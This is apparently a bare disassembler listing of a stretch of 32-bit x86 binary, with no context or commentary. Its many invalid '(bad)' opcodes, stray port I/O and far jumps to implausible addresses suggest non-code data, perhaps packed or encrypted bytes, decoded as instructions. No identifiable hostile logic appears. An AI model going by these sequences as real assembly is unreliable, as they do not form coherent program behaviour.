  4036b4:	sar    DWORD PTR [eax+ecx*4+0x6b],0xd
  4036b9:	or     dh,ch
  4036bb:	or     esp,DWORD PTR [esi+0x54a1db8f]
  4036c1:	ins    BYTE PTR es:[edi],dx
  4036c2:	cmp    DWORD PTR [edi+0x1ab04f6c],esi
  4036c8:	pop    edi
  4036c9:	mov    al,bl
  4036cb:	gs adc ah,cl
  4036ce:	adc    ah,BYTE PTR [edx+0x2e]
  4036d1:	es (bad) 
  4036d3:	sub    eax,0x292071ed
  4036d8:	inc    eax
  4036d9:	or     ebx,DWORD PTR [esi]
  4036db:	andps  xmm2,XMMWORD PTR [ebp+0x646563ab]
  4036e2:	aas    
  4036e3:	mov    dh,0x1
  4036e5:	xor    BYTE PTR [edi+0x610d127f],bh
  4036eb:	daa    
  4036ec:	ins    DWORD PTR es:[edi],dx
  4036ed:	mov    edx,0x7e503caa
  4036f2:	sub    DWORD PTR [eax],ecx
  4036f4:	stos   DWORD PTR es:[edi],eax
  4036f5:	add    al,BYTE PTR [ebx]
  4036f7:	dec    edi
  4036f8:	xlat   BYTE PTR ds:[ebx]
  4036f9:	and    al,0xba
  4036fb:	imul   edx,edx,0xbba679e5
  403701:	xchg   esp,eax
  403702:	mov    ?,WORD PTR [ecx]
  403704:	mov    al,0xe4
  403706:	mov    ebx,0x34304971
  40370b:	and    ah,BYTE PTR [esp+esi*2]
  40370e:	mov    eax,ds:0x89a5845b
  403713:	call   FWORD PTR [edi-0x16a001df]
  403719:	mov    al,ds:0x6d14c52c
  40371e:	sbb    eax,0x2b995832
  403723:	ficomp DWORD PTR [esi-0x16411407]
  403729:	sbb    esi,DWORD PTR [esi+ecx*2]
  40372c:	push   eax
  40372d:	push   ds
  40372e:	iret   
  40372f:	or     ch,0xdf
  403732:	xchg   BYTE PTR [ecx-0x4d8ee6fd],bh
  403738:	adc    esi,DWORD PTR ds:0xa8727c68
  40373e:	in     al,0x74
  403740:	dec    edi
  403741:	stos   DWORD PTR es:[edi],eax
  403742:	(bad)  
  403743:	push   esi
  403744:	adc    ah,bh
  403746:	jne    0x403766
  403748:	inc    ebp
  403749:	addr16 mov ds:0x7e7e,al
  40374d:	and    eax,0xdd64e429
  403752:	xor    DWORD PTR [eax+0x10],0x90065903
  403759:	or     ch,dh
  40375b:	or     ecx,0xc69cc983
  403761:	sti    
  403762:	js     0x40376e
  403764:	dec    ebx
  403765:	mov    al,0xdd
  403767:	addr16 enter 0x7a8f,0x58
  40376c:	xor    dh,bl
  40376e:	mov    dl,0xb7
  403770:	(bad)  
  403771:	xor    esp,ecx
  403773:	pop    ds
  403774:	or     esi,DWORD PTR [esp+esi*2-0x4]
  403778:	and    dl,bh
  40377a:	and    BYTE PTR [ebx+0x1e975930],ah
  403780:	ret    
  403781:	mov    ds:0x34686ff5,al
  403786:	inc    edi
  403787:	mov    bh,0x2d
  403789:	jg     0x4037ca
  40378b:	mov    ah,0x7a
  40378d:	mov    ebx,DWORD PTR [edx+0x78]
  403790:	mov    WORD PTR [eax+0x5d],cs
  403793:	les    esp,FWORD PTR [esi]
  403795:	push   ss
  403796:	xchg   edi,eax
  403797:	add    bl,BYTE PTR [ecx]
  403799:	mov    ds:0x8f002a8f,eax
  40379f:	or     eax,0x3c93e5e4
  4037a4:	in     eax,0x6d
  4037a6:	mov    ecx,0xf58de08b
  4037ab:	sbb    eax,DWORD PTR [ecx+esi*8+0x338968ad]
  4037b2:	ja     0x403795
  4037b4:	imul   esp,edi,0xaf5ecf7
  4037ba:	sbb    al,0x83
  4037bc:	(bad)  
  4037bd:	fidiv  DWORD PTR [edx]
  4037bf:	outs   dx,BYTE PTR ds:[esi]
  4037c0:	sti    
  4037c1:	sbb    al,0x55
  4037c3:	daa    
  4037c4:	out    0x10,eax
  4037c6:	or     al,0xb5
  4037c8:	ret    0x3161
  4037cb:	in     eax,dx
  4037cc:	repnz and ch,bh
  4037cf:	push   es
  4037d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037d1:	test   DWORD PTR [ecx],ebp
  4037d3:	ret    
  4037d4:	rep outs dx,DWORD PTR ds:[esi]
  4037d6:	push   0xffffff98
  4037d8:	aaa    
  4037d9:	stc    
  4037da:	in     al,dx
  4037db:	in     eax,0x22
  4037dd:	imul   esp,DWORD PTR [ecx+0x36],0x9dc44f14
  4037e4:	xchg   edx,eax
  4037e5:	int3   
  4037e6:	aas    
  4037e7:	jae    0x40381b
  4037e9:	add    eax,0x20bca04f
  4037ee:	adc    BYTE PTR [ebx+0x11],0x65
  4037f2:	sub    eax,0x504fa714
  4037f7:	xchg   ebx,eax
  4037f8:	arpl   WORD PTR [ecx+0x2a],si
  4037fb:	bound  ecx,QWORD PTR [esi]
  4037fd:	pop    ss
  4037fe:	stos   DWORD PTR es:[edi],eax
  4037ff:	scas   eax,DWORD PTR es:[edi]
  403800:	pop    ebp
  403801:	fidiv  DWORD PTR [esi-0x141bb444]
  403807:	loope  0x403790
  403809:	inc    esp
  40380a:	jae    0x40381c
  40380c:	or     bl,BYTE PTR [ecx+edx*2+0x46cf2cc1]
  403813:	cmp    al,0xb0
  403815:	repnz (bad) 
  403817:	sub    DWORD PTR [ebx+ebp*1],esi
  40381a:	fwait
  40381b:	jmp    FWORD PTR [esi+edx*8]
  40381e:	inc    ebp
  40381f:	inc    esi
  403820:	fadd   DWORD PTR [edi+ebx*1-0x7f9935eb]
  403827:	add    eax,0xd3ad8faf
  40382c:	jnp    0x403856
  40382e:	loope  0x4037d7
  403830:	mov    dh,0xe3
  403832:	(bad)  
  403833:	loopne 0x4037da
  403835:	or     BYTE PTR [edi],al
  403837:	xchg   esp,eax
  403838:	icebp  
  403839:	or     eax,0xaa9ad953
  40383e:	cmp    eax,0xe0588266
  403843:	or     ecx,eax
  403845:	mov    cl,0x8f
  403847:	pop    ds
  403848:	daa    
  403849:	cmc    
  40384a:	fld    DWORD PTR [edi]
  40384c:	xchg   edx,eax
  40384d:	xchg   ecx,eax
  40384e:	jge    0x403840
  403850:	mov    ds:0xaa7dca13,al
  403855:	lds    ebx,FWORD PTR [ecx+0x45021bf7]
  40385b:	test   al,0xf8
  40385d:	jg     0x40382d
  40385f:	sbb    al,BYTE PTR [eax-0x5f]
  403862:	adc    eax,edx
  403864:	mov    ds:0xcbd45a8f,al
  403869:	xor    BYTE PTR ds:0x44220c2a,0xd6
  403870:	je     0x4038ac
  403872:	icebp  
  403873:	xchg   edi,eax
  403874:	cwde   
  403875:	out    0xfa,eax
  403877:	xor    eax,0x22659bd6
  40387c:	int3   
  40387d:	xchg   esi,ebp
  40387f:	cmp    eax,DWORD PTR [edx]
  403881:	lds    edi,FWORD PTR [esi-0x5a]
  403884:	int3   
  403885:	mov    esi,0x79a85c0c
  40388a:	jb     0x40387f
  40388c:	inc    edx
  40388d:	fs xchg ecx,eax
  40388f:	cmp    dh,cl
  403891:	mov    bh,0x2d
  403893:	jmp    0xbe5cf4b
  403898:	retf   0xc06d
  40389b:	hlt    
  40389c:	fidivr WORD PTR [esi+ebp*1]
  40389f:	or     eax,0x87650499
  4038a4:	xchg   edi,eax
  4038a5:	fsub   DWORD PTR [ebp-0x26]
  4038a8:	and    ecx,edi
  4038aa:	(bad)  
  4038ab:	(bad)  
  4038ac:	cli    
  4038ad:	add    cl,ch
  4038af:	mov    cl,0xdc
  4038b1:	(bad)  
  4038b2:	cs ins DWORD PTR es:[edi],dx
  4038b4:	inc    edi
  4038b5:	push   es
  4038b6:	pop    esp
  4038b7:	mov    esi,0x3a4a9399
  4038bc:	sub    ah,BYTE PTR [eax-0x1d]
  4038bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038c0:	sbb    DWORD PTR [edx],0x15f0048f
  4038c6:	je     0x403869
  4038c8:	fld    TBYTE PTR ds:0x854c8af3
  4038ce:	push   ebp
  4038cf:	in     eax,0x4
  4038d1:	imul   ebp,DWORD PTR [eax-0x3e],0x55781dc7
  4038d8:	imul   edi,DWORD PTR [edi+ebx*2+0x637a9271],0xffffff8a
  4038e0:	arpl   WORD PTR [esi],sp
  4038e2:	add    eax,0x96403ed9
  4038e7:	dec    eax
  4038e8:	out    dx,eax
  4038e9:	repnz cld 
  4038eb:	xor    al,0x89
  4038ed:	mov    esp,0x6144ce08
  4038f2:	adc    ch,BYTE PTR [eax]
  4038f4:	or     edx,esi
  4038f6:	lods   al,BYTE PTR ds:[esi]
  4038f7:	pop    eax
  4038f8:	stc    
  4038f9:	sub    ch,dh
  4038fb:	cli    
  4038fc:	pop    edx
  4038fd:	or     dl,BYTE PTR [ebx]
  4038ff:	dec    edi
  403900:	iret   
  403901:	pusha  
  403902:	popf   
  403903:	fwait
  403904:	mov    eax,0x4dfadb5b
  403909:	sub    eax,0xf3b1b0c
  40390e:	jmp    0x8d355572
  403913:	sbb    edx,DWORD PTR [edx]
  403915:	cli    
  403916:	mov    dl,0x62
  403918:	jle    0x40396b
  40391a:	fdivr  st,st(1)
  40391c:	ins    BYTE PTR es:[edi],dx
  40391d:	cmp    BYTE PTR [ebx],bl
  40391f:	outs   dx,BYTE PTR ds:[esi]
  403920:	and    DWORD PTR [edi+0x4991867b],ebx
  403926:	xchg   ebx,eax
  403927:	jl     0x403964
  403929:	pusha  
  40392a:	out    0x84,al
  40392c:	mov    esi,DWORD PTR [eax]
  40392e:	test   al,0xaa
  403930:	pop    eax
  403931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403932:	or     DWORD PTR [edx],0x37f85b35
  403938:	xchg   ecx,eax
  403939:	sbb    DWORD PTR [ecx],0xfc6d7ba
  40393f:	mov    eax,ds:0x87e3a8df
  403944:	mov    bl,0x90
  403946:	mov    al,0x68
  403948:	adc    dl,ch
  40394a:	add    edi,eax
  40394c:	add    DWORD PTR [ebp-0x34a7a745],0x38
  403953:	sub    al,0x24
  403955:	and    BYTE PTR [edi+0x77],0x5d
  403959:	test   eax,0x5c1e7718
  40395e:	mov    eax,0x86f74bb2
  403963:	dec    ecx
  403964:	cdq    
  403965:	xor    ah,bl
  403967:	pushf  
  403968:	pusha  
  403969:	lds    edx,FWORD PTR [ecx-0x78f0b36d]
  40396f:	mov    al,ds:0x615e7e54
  403974:	sub    DWORD PTR [eax+0x11],ebp
  403977:	dec    eax
  403978:	sub    cl,BYTE PTR [ebp-0x30a4bb5e]
  40397e:	ds cs aaa 
  403981:	xchg   edi,eax
  403982:	mov    eax,ds:0x4c12635d
  403987:	adc    DWORD PTR [eax+esi*1+0x7a],esp
  40398b:	and    al,0x23
  40398d:	xlat   BYTE PTR ds:[ebx]
  40398e:	mov    ebp,0x37e8127
  403993:	lea    eax,[eax-0x5f9d3605]
  403999:	jno    0x4039e2
  40399b:	ja     0x403972
  40399d:	out    0xad,al
  40399f:	inc    edi
  4039a0:	lds    edi,FWORD PTR [edi]
  4039a2:	cs push ebx
  4039a4:	mov    al,0x79
  4039a6:	mov    dl,0x86
  4039a8:	retf   
  4039a9:	xchg   edi,eax
  4039aa:	sti    
  4039ab:	inc    ecx
  4039ac:	retf   
  4039ad:	push   ds
  4039ae:	(bad)  
  4039af:	and    ch,BYTE PTR [edx+0x3ea7c8c8]
  4039b5:	cld    
  4039b6:	mov    DWORD PTR [edx],esi
  4039b8:	cmp    dh,dh
  4039ba:	dec    ebx
  4039bb:	pop    ds
  4039bc:	rcl    edi,1
  4039be:	shl    esi,cl
  4039c0:	inc    eax
  4039c1:	repz lock das 
  4039c4:	stos   BYTE PTR es:[edi],al
  4039c5:	mov    al,0x64
  4039c7:	xchg   ebx,eax
  4039c8:	fs stc 
  4039ca:	into   
  4039cb:	xchg   esi,eax
  4039cc:	mov    al,0xaf
  4039ce:	fisub  DWORD PTR [edx+0x78]
  4039d1:	inc    ebx
  4039d3:	mov    bl,0x2a
  4039d5:	jnp    0x403a02
  4039d7:	inc    eax
  4039d8:	push   cs
  4039d9:	mov    edx,0x71d80a5e
  4039de:	loopne 0x403960
  4039e0:	fimul  WORD PTR [edx+eiz*4-0x65]
  4039e4:	in     eax,0x0
  4039e6:	jle    0x403a23
  4039e8:	aas    
  4039e9:	push   0x76f25334
  4039ee:	sbb    edi,esi
  4039f0:	xor    ch,al
  4039f2:	ds (bad) 
  4039f4:	call   0xc52ac326
  4039f9:	mov    al,BYTE PTR [edx-0x6285801]
  4039ff:	mov    dl,0x83
  403a01:	jnp    0x403a3a
  403a03:	jl     0x403a7c
  403a05:	and    eax,DWORD PTR [edi-0x34]
  403a08:	cmp    al,0x89
  403a0a:	stc    
  403a0b:	lahf   
  403a0c:	les    esi,FWORD PTR [edi]
  403a0e:	xor    eax,0x7d3fd927
  403a13:	xchg   esi,eax
  403a14:	gs cmp al,0xc7
  403a17:	hlt    
  403a18:	lahf   
  403a19:	sub    BYTE PTR [edi-0x4c0882f1],dl
  403a1f:	sbb    al,0x85
  403a21:	mov    dl,0x28
  403a23:	sbb    BYTE PTR [ebx+eiz*8],al
  403a26:	mov    al,ds:0xa1d0a2e9
  403a2b:	(bad)  
  403a2c:	das    
  403a2d:	mov    cl,0x1d
  403a2f:	or     BYTE PTR [eax-0x1206d7a1],dl
  403a35:	sub    bh,BYTE PTR [eax-0x6b]
  403a38:	or     ebx,DWORD PTR [ecx+0x5cb19453]
  403a3e:	or     esp,esp
  403a40:	out    dx,al
  403a41:	mov    bh,BYTE PTR [edi]
  403a43:	loopne 0x403a36
  403a45:	gs jo  0x403abe
  403a48:	or     al,0xb
  403a4b:	adc    ebx,DWORD PTR [ebx+0x108b8a80]
  403a51:	xchg   edx,eax
  403a52:	mov    ebp,0xdb2993df
  403a57:	icebp  
  403a58:	scas   al,BYTE PTR es:[edi]
  403a59:	xchg   ecx,eax
  403a5a:	inc    esi
  403a5b:	arpl   WORD PTR [eax+0x2f975d9],cx
  403a61:	sub    al,dh
  403a63:	sar    DWORD PTR [esi-0x3c],cl
  403a66:	push   cs
  403a67:	mov    ch,0xb3
  403a69:	mov    DWORD PTR [ebx-0x4f12e33e],eax
  403a6f:	mov    al,ds:0xc5560a3d
  403a74:	mov    ss,WORD PTR [ebx+ecx*4-0x12a18e4]
  403a7b:	mov    edi,0x3ac95e2a
  403a80:	out    0x7a,al
  403a82:	inc    edi
  403a83:	stos   DWORD PTR es:[edi],eax
  403a84:	lds    ebp,FWORD PTR [edx-0x72]
  403a87:	push   ss
  403a88:	mov    ah,0x5b
  403a8a:	mov    edx,0x74914c34
  403a8f:	jecxz  0x403a4a
  403a91:	adc    ebx,edi
  403a93:	jle    0x403a33
  403a95:	adc    eax,0x3998dc7d
  403a9a:	fs leave 
  403a9c:	test   DWORD PTR [ecx],edi
  403a9e:	pusha  
  403a9f:	inc    ebp
  403aa0:	dec    eax
  403aa1:	aad    0x2
  403aa3:	xchg   edx,eax
  403aa4:	adc    DWORD PTR [ebp+0x3e7343e6],eax
  403aaa:	jl     0x403aad
  403aac:	dec    edi
  403aad:	dec    ebp
  403aae:	nop    DWORD PTR [edx+0x4a11235b]
  403ab5:	das    
  403ab6:	sbb    eax,0xe927a379
  403abb:	or     eax,0xe3462106
  403ac0:	mov    bh,0xf2
  403ac2:	and    DWORD PTR [edx-0xb651490],0xaa210d1a
  403acc:	dec    esi
  403acd:	test   cl,ch
  403acf:	pop    ds
  403ad0:	jno    0x403ada
  403ad2:	stos   BYTE PTR es:[edi],al
  403ad3:	adc    edi,edi
  403ad5:	pushf  
  403ad6:	imul   esi,ecx,0x5568a123
  403adc:	aas    
  403add:	out    dx,al
  403ade:	pop    ebx
  403adf:	xchg   ebx,eax
  403ae0:	cli    
  403ae1:	or     cl,0x7f
  403ae4:	or     bl,BYTE PTR [ecx+eax*4]
  403ae7:	xor    DWORD PTR [esi],eax
  403ae9:	in     eax,0xe2
  403aeb:	enter  0x5224,0x88
  403aef:	dec    edx
  403af0:	sbb    al,0x30
  403af3:	fcomi  st,st(3)
  403af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af6:	inc    esi
  403af7:	xor    esp,edx
  403af9:	cmp    DWORD PTR [esi-0xf],ebp
  403afc:	dec    eax
  403afd:	mov    WORD PTR [ebx],cs
  403aff:	dec    esp
  403b00:	mov    WORD PTR cs:[ebx+0x46c23309],cs
  403b07:	imul   ch
  403b09:	or     al,0x6c
  403b0b:	jae    0x403b3e
  403b0d:	loope  0x403af8
  403b0f:	dec    ebp
  403b10:	sbb    BYTE PTR [edi-0xb],dh
  403b13:	add    ecx,DWORD PTR [ebx+0x5b1a933c]
  403b19:	neg    cl
  403b1b:	out    0x31,al
  403b1d:	(bad)  
  403b1e:	out    dx,eax
  403b1f:	cmp    DWORD PTR [edi+0x63],esi
  403b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b23:	fisub  WORD PTR [ebx+0x44e29388]
  403b29:	rcr    BYTE PTR [edi+edi*1],0x2a
  403b2d:	sbb    al,0x90
  403b2f:	xchg   BYTE PTR [ecx+0x34],bl
  403b32:	push   ebp
  403b33:	out    dx,al
  403b34:	rcr    BYTE PTR [edx*1+0x411a3fe2],1
  403b3b:	aam    0x55
  403b3d:	xor    eax,0x3168e99f
  403b42:	adc    DWORD PTR [edx+0x2c1324a],0xffffff9a
  403b49:	add    DWORD PTR [edx-0x74],edx
  403b4c:	iret   
  403b4d:	sar    DWORD PTR [eax],cl
  403b4f:	popf   
  403b50:	leave  
  403b51:	xor    al,0xbe
  403b53:	jle    0x403ae1
  403b55:	test   DWORD PTR [esi+ebx*4-0x8],esp
  403b59:	xor    ah,BYTE PTR [edx-0x2f26f5fa]
  403b5f:	sub    eax,0xc2be3bd3
  403b64:	sub    dh,BYTE PTR [esi+ebp*8-0x54d01167]
  403b6b:	scas   eax,DWORD PTR es:[edi]
  403b6c:	jecxz  0x403b3e
  403b6e:	pop    esp
  403b6f:	mov    ah,0x85
  403b71:	dec    esi
  403b72:	add    bl,bh
  403b74:	xor    DWORD PTR [edx+0x74ebb29b],edi
  403b7a:	outs   dx,DWORD PTR ds:[esi]
  403b7b:	int    0x2e
  403b7d:	(bad)  
  403b7e:	pop    ds
  403b7f:	lods   al,BYTE PTR ds:[esi]
  403b80:	add    bl,BYTE PTR [ecx]
  403b82:	sbb    edx,0x42
  403b85:	mov    BYTE PTR [edi+0x71],ch
  403b88:	and    al,0xe9
  403b8a:	xchg   esi,eax
  403b8b:	mov    al,ds:0x51ce36e0
  403b90:	(bad)  
  403b91:	adc    ch,BYTE PTR [esi+edx*1+0x25956933]
  403b98:	push   edx
  403b99:	popf   
  403b9a:	push   ecx
  403b9b:	push   0x17
  403b9d:	out    dx,al
  403b9e:	xchg   edx,eax
  403b9f:	xor    ah,BYTE PTR [edi]
  403ba1:	xchg   ebx,eax
  403ba2:	ret    
  403ba3:	or     ebp,ecx
  403ba5:	push   DWORD PTR [edi+0x23]
  403ba8:	inc    eax
  403ba9:	pop    ebp
  403baa:	sahf   
  403bab:	stos   BYTE PTR es:[edi],al
  403bac:	push   esi
  403bad:	cmp    eax,0x28cf064e
  403bb2:	push   es
  403bb3:	sbb    ecx,ecx
  403bb5:	xchg   edi,eax
  403bb6:	jb     0x403b69
  403bb8:	cmp    BYTE PTR [esi-0x6ce58461],ah
  403bbe:	push   0x41
  403bc0:	xchg   BYTE PTR [ecx+ebp*2],ch
  403bc3:	leave  
  403bc4:	pop    ds
  403bc5:	jno    0x403bc6
  403bc7:	xchg   ecx,eax
  403bc8:	data16 aad 0x9f
  403bcb:	(bad)  
  403bcc:	std    
  403bcd:	ins    BYTE PTR es:[edi],dx
  403bce:	pop    esi
  403bcf:	sahf   
  403bd0:	test   al,0xb2
  403bd2:	and    DWORD PTR [edx],esi
  403bd4:	mov    al,0x6
  403bd6:	xchg   edx,eax
  403bd7:	leave  
  403bd8:	data16 fcomip st,st(3)
  403bdb:	xchg   edi,eax
  403bdc:	cmp    DWORD PTR [esi+eiz*8-0x2a],ebx
  403be0:	and    ebx,esi
  403be2:	clc    
  403be3:	jg     0x403bc8
  403be5:	mov    dh,0x55
  403be7:	int3   
  403be8:	push   esp
  403be9:	pusha  
  403bea:	add    al,0x60
  403bec:	call   0xb4383f71
  403bf1:	sub    DWORD PTR [ecx+0x25b5fd09],edi
  403bf7:	addr16 out dx,al
  403bf9:	lock or esp,edi
  403bfc:	lahf   
  403bfd:	mov    BYTE PTR ds:0xf052f3bd,ch
  403c03:	push   esp
  403c04:	xor    BYTE PTR [edi],dh
  403c06:	pushf  
  403c07:	pop    esi
  403c08:	lock cmp eax,0x6e9aed76
  403c0e:	sbb    ebx,DWORD PTR [ebx-0x5c8e3db3]
  403c14:	repz add DWORD PTR [ebx+eax*2],edx
  403c18:	mov    esi,ss
  403c1a:	pop    ecx
  403c1b:	fwait
  403c1c:	stos   DWORD PTR es:[edi],eax
  403c1d:	ror    ebp,0x70
  403c20:	sbb    DWORD PTR [ebp-0x20],ebp
  403c23:	js     0x403c3c
  403c25:	xchg   bp,ax
  403c27:	or     al,0x31
  403c29:	ja     0x403bbb
  403c2b:	push   ss
  403c2c:	shr    DWORD PTR [eax-0x49],1
  403c2f:	dec    ebp
  403c30:	xchg   esi,eax
  403c31:	call   0xd0b6849e
  403c36:	mov    al,0x55
  403c38:	stos   DWORD PTR es:[edi],eax
  403c39:	mov    esi,0x956258bb
  403c3e:	test   BYTE PTR [eax+0x3],cl
  403c41:	pop    es
  403c42:	or     edx,edx
  403c44:	leave  
  403c45:	sbb    eax,0x162cdca9
  403c4a:	adc    ebx,edi
  403c4c:	mov    ebp,0x4f4b8b32
  403c51:	jne    0x403cc1
  403c53:	dec    ebp
  403c54:	xchg   ebp,eax
  403c55:	shl    bx,cl
  403c58:	nop
  403c59:	call   0x290e8ac8
  403c5e:	jg     0x403bf6
  403c60:	iret   
  403c61:	xor    BYTE PTR [ebp+0x7],cl
  403c64:	mov    eax,ds:0xf7529419
  403c69:	inc    esi
  403c6a:	cdq    
  403c6b:	jae    0x403c4f
  403c6d:	fiadd  WORD PTR [ebp+0x47f78a84]
  403c73:	out    dx,eax
  403c74:	pop    edx
  403c75:	and    edx,DWORD PTR [eax-0x1e]
  403c78:	stos   DWORD PTR es:[edi],eax
  403c79:	and    eax,0x55db16d1
  403c7e:	cld    
  403c7f:	push   cs
  403c80:	imul   esi,esp,0x1dc1a8b0
  403c86:	jo     0x403c9b
  403c88:	fdivr  QWORD PTR [edx-0x184f4ecf]
  403c8e:	scas   eax,DWORD PTR es:[edi]
  403c8f:	xlat   BYTE PTR ds:[ebx]
  403c90:	dec    edx
  403c91:	jmp    0x403cc5
  403c93:	fldenv [edx]
  403c96:	loopne 0x403cb3
  403c98:	je     0x403d10
  403c9a:	ffree  st(3)
  403c9c:	mov    ebp,0x1efc8df3
  403ca1:	hlt    
  403ca2:	sbb    ecx,esi
  403ca4:	mov    eax,ebx
  403ca6:	xor    ah,dh
  403ca8:	or     edi,DWORD PTR [ecx]
  403caa:	xchg   ebx,eax
  403cab:	imul   edx,DWORD PTR [edi+eax*4-0x2bd7e9d2],0x15
  403cb3:	ins    DWORD PTR es:[edi],dx
  403cb4:	jmp    0x844de6e9
  403cb9:	das    
  403cba:	in     eax,dx
  403cbb:	xchg   esp,eax
  403cbc:	mov    dl,0x7
  403cbe:	sbb    BYTE PTR [edx-0x32d1f841],ch
  403cc4:	or     edi,eax
  403cc6:	pop    ebx
  403cc7:	cmp    ch,al
  403cc9:	sti    
  403cca:	ret    
  403ccb:	in     eax,dx
  403ccc:	sbb    eax,0xbd817ae5
  403cd1:	lods   eax,DWORD PTR ds:[esi]
  403cd2:	push   ds
  403cd3:	icebp  
  403cd4:	xor    al,0x61
  403cd6:	into   
  403cd7:	sahf   
  403cd8:	cwde   
  403cd9:	pop    esp
  403cda:	adc    dh,ah
  403cdc:	fisub  DWORD PTR es:[esi]
  403cdf:	in     al,0x64
  403ce1:	lods   eax,DWORD PTR ds:[esi]
  403ce2:	in     eax,dx
  403ce3:	xlat   BYTE PTR ds:[ebx]
  403ce4:	(bad)  
  403ce5:	push   ebx
  403ce6:	and    DWORD PTR [ebx+edx*4+0x5f],ebx
  403cea:	jge    0x403d51
  403cec:	inc    esp
  403ced:	jmp    0xb418:0xa9a1504c
  403cf4:	lahf   
  403cf5:	jb     0x403c85
  403cf7:	std    
  403cf8:	in     eax,dx
  403cf9:	pop    es
  403cfa:	inc    esp
  403cfb:	sar    edx,0x87
  403cfe:	and    ch,BYTE PTR [edi]
  403d00:	push   cs
  403d01:	xchg   edx,eax
  403d02:	or     edi,DWORD PTR [ecx+edi*1+0x7b]
  403d06:	or     BYTE PTR [edx],ch
  403d08:	out    dx,eax
  403d09:	dec    esi
  403d0a:	pop    eax
  403d0b:	int3   
  403d0c:	xchg   ebp,eax
  403d0d:	jmp    0x403d7f
  403d0f:	xor    eax,0x885bcbf4
  403d14:	mov    ecx,0x6a956c7b
  403d19:	lahf   
  403d1a:	add    BYTE PTR [ecx],0x1c
  403d1d:	imul   eax,DWORD PTR [esi-0x52],0xffffffce
  403d21:	push   cs
  403d22:	ds das 
  403d24:	stos   DWORD PTR es:[edi],eax
  403d25:	xor    eax,0xd5dbc219
  403d2a:	mov    edx,edi
  403d2c:	gs stos BYTE PTR es:[edi],al
  403d2e:	xor    dh,BYTE PTR [esi]
  403d30:	daa    
  403d31:	fld    TBYTE PTR [ebx-0x563acbcd]
  403d37:	and    esi,ebx
  403d39:	ins    DWORD PTR es:[edi],dx
  403d3a:	rcr    DWORD PTR [edi+0x9f6163b],1
  403d40:	retf   0x1d19
  403d43:	pop    esi
  403d44:	push   ebp
  403d45:	cmc    
  403d46:	push   0xffffffbf
  403d48:	push   ds
  403d49:	sbb    DWORD PTR [ecx-0x68be663a],ebx
  403d4f:	lea    esp,[ecx-0x38]
  403d52:	pop    ebx
  403d53:	hlt    
  403d54:	xchg   BYTE PTR [edx+0x1121f845],dl
  403d5a:	jns    0x403d06
  403d5c:	imul   edx,DWORD PTR cs:[edi+0x43],0x25574e12
  403d64:	pop    ecx
  403d65:	cli    
  403d66:	ds mov dh,0x3f
  403d69:	std    
  403d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6b:	jg     0x403d80
  403d6d:	inc    eax
  403d6e:	fsin   
  403d70:	and    BYTE PTR [esi-0x35606fee],dh
  403d76:	inc    DWORD PTR [eax+edi*1]
  403d79:	mov    dh,0x69
  403d7b:	xor    DWORD PTR [edx+edi*8-0x75b63ac5],ecx
  403d82:	or     DWORD PTR [edx],ebx
  403d84:	(bad)
  403d88:	data16 or al,0x53
  403d8b:	arpl   WORD PTR [edx+0x5cc9620f],di
  403d91:	or     ecx,DWORD PTR [esi]
  403d93:	setno  BYTE PTR [ecx+0x2b]
  403d97:	push   0xffffff88
  403d99:	ins    BYTE PTR es:[edi],dx
  403d9a:	repz cmp edx,DWORD PTR [edi]
  403d9d:	sub    dl,dl
  403d9f:	pop    es
  403da0:	call   0x790b:0x54960c25
  403da7:	(bad)  
  403da8:	mov    cl,0x13
  403daa:	aaa    
  403dab:	and    ebx,ecx
  403dad:	xchg   esi,eax
  403dae:	pop    ds
  403daf:	int3   
  403db0:	js     0x403dea
  403db2:	jb     0x403d71
  403db4:	mov    ds:0x92d4577f,al
  403db9:	mov    esp,0x5ae87200
  403dbe:	xor    eax,0xddc94d7d
  403dc3:	and    ebp,ebp
  403dc5:	out    dx,eax
  403dc6:	rol    DWORD PTR [ebx],cl
  403dc8:	mov    ?,WORD PTR [ecx]
  403dca:	xchg   edx,eax
  403dcb:	mov    ebx,DWORD PTR [ebx+esi*8+0x7d5a6f65]
  403dd2:	in     al,dx
  403dd3:	mov    ds:0xa7e2c77c,al
  403dd8:	sub    al,0x83
  403dda:	pop    ss
  403ddb:	iret   
  403ddc:	rcr    ebx,1
  403dde:	(bad)  
  403ddf:	xlat   BYTE PTR ds:[ebx]
  403de0:	mov    al,BYTE PTR [ebx+0x7c56707f]
  403de6:	jnp    0x403e33
  403de8:	es dec ecx
  403dea:	mov    DWORD PTR [ebp+0x13],ebx
  403ded:	cmp    ecx,ecx
  403def:	cmc    
  403df0:	mov    dh,0x6c
  403df2:	xor    DWORD PTR [eax+edi*8-0x279b9fe8],0x57
  403dfa:	fsub   DWORD PTR [ebx-0x1d0d2c86]
  403e00:	lods   al,BYTE PTR ds:[esi]
  403e01:	ins    DWORD PTR es:[edi],dx
  403e02:	fisub  DWORD PTR [ecx-0x7f]
  403e05:	sbb    ch,BYTE PTR [edi-0x70dcd06e]
  403e0b:	pop    es
  403e0c:	sub    BYTE PTR [edi-0x7f],al
  403e0f:	cmp    eax,0xe3934393
  403e14:	leave  
  403e15:	jmp    0x68b0:0x44a14f36
  403e1c:	push   ds
  403e1d:	add    eax,0x97bf16c3
  403e22:	repnz xchg ebx,eax
  403e24:	fs mov eax,ds:0xced8f169
  403e2b:	ja     0x403dec
  403e2d:	cld    
  403e2e:	xchg   DWORD PTR [edi-0xf],esp
  403e31:	cmp    BYTE PTR [edi-0x110ab1ef],cl
  403e37:	rol    BYTE PTR [edx-0x1d],0xb5
  403e3b:	hlt    
  403e3c:	outs   dx,DWORD PTR ds:[esi]
  403e3d:	fbstp  TBYTE PTR [edi-0x337a4960]
  403e43:	leave  
  403e44:	cmp    al,0xe9
  403e46:	mov    edx,0xd0cac716
  403e4b:	mov    al,ds:0x471f68b1
  403e50:	scas   al,BYTE PTR es:[edi]
  403e51:	cmp    DWORD PTR [edi-0xb],eax
  403e54:	mov    esp,0x4895ed3f
  403e59:	sbb    al,0x44
  403e5b:	fisttp QWORD PTR [ecx-0x4ef2bfb6]
  403e61:	dec    edx
  403e62:	jge    0x403de4
  403e64:	xchg   edx,eax
  403e65:	mov    eax,0x1e221c83
  403e6a:	jnp    0x403eb5
